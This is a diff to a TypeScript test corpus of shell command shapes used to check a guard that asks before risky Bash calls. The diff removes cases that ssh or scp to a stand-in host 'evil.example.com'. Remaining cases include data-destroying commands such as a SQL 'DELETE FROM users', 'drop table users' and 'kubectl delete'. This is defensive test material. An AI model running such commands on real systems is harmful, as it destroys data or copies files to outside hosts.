@@ -1,7 +1,7 @@
 /**
  * Command shapes from a downstream project's scan of 228 transcripts (13k Bash calls, 142 asks): the false positives that
  * trained people to click yes, and the true positives that must keep asking. `quiet` shapes must raise no
- * ask from the remote-host guard and the write guard; `asks` shapes must raise at least one.
+ * ask from the write guard; `asks` shapes must raise at least one.
  */
 export interface ICorpusEntry {
   id: string;
@@ -87,11 +87,6 @@ export const ASKS: ICorpusEntry[] = [
     command: 'bash <<EOF\nkubectl apply -f deploy.yaml\nEOF',
   },
   {
-    id: 'a03',
-    note: 'ssh to a host that is not listed, with a heredoc script',
-    command: 'ssh prod1.example.com <<EOF\nls\nEOF',
-  },
-  {
     id: 'a04',
     note: 'a SQL delete fed to psql by a heredoc',
     command: 'psql -d app <<EOF\nDELETE FROM users;\nEOF',
@@ -115,16 +110,9 @@ export const ASKS: ICorpusEntry[] = [
     note: 'a deploy in a command substitution',
     command: 'echo $(kubectl delete pod x)',
   },
-  { id: 'a12', note: 'ssh to a host that is not listed', command: 'ssh evil.example.com uptime' },
-  { id: 'a13', note: 'scp to a host that is not listed', command: 'scp f evil.example.com:/tmp' },
   { id: 'a14', note: 'a deploy through xargs', command: 'xargs kubectl delete -f' },
   { id: 'a15', note: 'docker compose up', command: 'docker compose up -d' },
   { id: 'a16', note: 'a SQL drop through mysql -e', command: 'mysql -e "drop table users"' },
-  {
-    id: 'a17',
-    note: 'ssh to a host that is not listed inside a heredoc that feeds bash',
-    command: 'bash <<EOF\nssh evil.example.com uptime\nEOF',
-  },
   {
     id: 'a18',
     note: 'a deploy from python read from a heredoc',
@@ -145,11 +133,6 @@ export const ASKS: ICorpusEntry[] = [
     id: 'a23',
     note: 'a deploy printed into sh: what echo prints is code there',
     command: 'echo "kubectl apply -f x" | sh',
-  },
-  {
-    id: 'a24',
-    note: 'ssh to a host that is not listed, behind a data heredoc and a print',
-    command: "cat > notes.md <<'EOF'\nhello\nEOF\necho done && ssh evil.example.com uptime",
   },
   {
     id: 'a22',
